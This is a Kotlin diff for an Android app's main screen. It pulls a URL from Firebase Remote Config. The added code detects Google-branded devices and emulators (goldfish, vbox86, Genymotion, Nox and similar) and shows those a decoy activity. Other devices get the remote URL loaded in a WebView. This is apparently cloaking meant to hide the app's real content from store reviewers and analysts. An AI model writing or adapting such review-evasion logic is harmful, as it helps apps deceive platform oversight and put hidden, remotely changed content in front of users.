@@ -10,8 +10,10 @@ import android.os.Bundle
 import android.util.Log
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
+import com.google.firebase.remoteconfig.BuildConfig
 import com.google.firebase.remoteconfig.FirebaseRemoteConfig
 import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
+import java.util.Locale
 
 class MainActivity : AppCompatActivity() {
 
@@ -20,7 +22,6 @@ class MainActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        setContentView(R.layout.activity_webview)
 
 
         // Проверяем доступность сети
@@ -39,7 +40,7 @@ class MainActivity : AppCompatActivity() {
 
         if (savedUrl.isNullOrEmpty()) {
             processRemoteConfigData()
-            // Если сохраненная ссылка отсутствует или пустая, открываем AnotherActivity
+            // Если сохраненная ссылка отсутствует или пустая
             Log.d("MainActivity", "ссылка пустая")
 
         } else {
@@ -64,10 +65,17 @@ class MainActivity : AppCompatActivity() {
                         val url = mFirebaseRemoteConfig.getString("url")
                         Log.d("MainActivity", "Значение URL из Remote Config: $url")
 
-                        if (url.isEmpty() || isGoogleDevice(url) || isEmulator(url)) {
+                        if (url.isEmpty() || isGoogleDevice() || isEmulator()) {
                             openAnotherActivity()
-                            Log.d("MainActivity", "прошла условие Значение URL из Remote Config: $url")
+                            Log.d(
+                                "MainActivity",
+                                "прошла условие Значение URL из Remote Config: $url"
+                            )
                         } else {
+                            Log.d(
+                                "MainActivity",
+                                "зашел"
+                            )
                             with(sharedPrefs.edit()) {
                                 putString("savedUrl", url)
                                 apply()
@@ -86,8 +94,9 @@ class MainActivity : AppCompatActivity() {
     private fun openAnotherActivity() {
         val intent = Intent(this@MainActivity, AnotherActivity::class.java)
         startActivity(intent)
-        Log.d("MainActivity", "Первый запуск приложения, открываем AnotherActivity")
+        Log.d("MainActivity", " открываем AnotherActivity")
     }
+
     private fun openWebViewActivity() {
         val intent = Intent(this@MainActivity, WebViewActivity::class.java)
         startActivity(intent)
@@ -118,14 +127,38 @@ class MainActivity : AppCompatActivity() {
         startActivity(errorIntent)
     }
 
-    private fun isGoogleDevice(url: String): Boolean {
-        Log.d("MainActivity", "isGoogleDevice:")
-        return url.contains("google")
+    private fun isGoogleDevice(): Boolean {
+        return Build.BRAND.equals("google", ignoreCase = true)
     }
 
-    private fun isEmulator(url: String): Boolean {
-        Log.d("MainActivity", "isEmulator:")
-        return !url.isNotEmpty() || Build.FINGERPRINT.startsWith("generic")
+
+    private fun isEmulator(): Boolean {
+        if (BuildConfig.DEBUG) return false
+
+        val phoneModel = Build.MODEL
+        val buildProduct = Build.PRODUCT
+        val buildHardware = Build.HARDWARE
+        val brand = Build.BRAND
+
+        val result = (Build.FINGERPRINT.startsWith("generic") ||
+                phoneModel.contains("google_sdk") ||
+                phoneModel.contains("Emulator") ||
+                phoneModel.contains("Android SDK built for x86") ||
+                Build.MANUFACTURER.contains("Genymotion") ||
+                buildHardware == "goldfish" ||
+                brand.contains("google") ||
+                buildHardware == "vbox86" ||
+                buildProduct == "sdk" ||
+                buildProduct == "google_sdk" ||
+                buildProduct == "sdk_x86" ||
+                buildProduct == "vbox86p" ||
+                Build.BOARD.contains("nox") ||
+                Build.BOOTLOADER.contains("nox") ||
+                buildHardware.contains("nox") ||
+                buildProduct.contains("nox"))
+
+        return result
     }
+
 
 }
